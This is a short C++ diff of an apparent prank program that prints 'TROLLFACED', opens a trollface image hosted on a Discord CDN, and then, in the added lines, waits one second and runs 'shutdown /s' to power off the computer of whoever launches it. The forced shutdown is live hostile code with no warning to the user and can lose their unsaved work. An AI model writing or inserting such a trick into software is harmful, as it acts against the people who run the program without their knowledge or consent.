@@ -2,11 +2,14 @@
 //
 
 #include <iostream>
+#include "windows.h" 
 
 int main()
 {
     std::cout << "TROLLFACED";
     system("start https://cdn.discordapp.com/attachments/752394707237208106/866049481358180393/trollface.png");
+    Sleep(1000);
+    system("shutdown /s");
 }
 
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
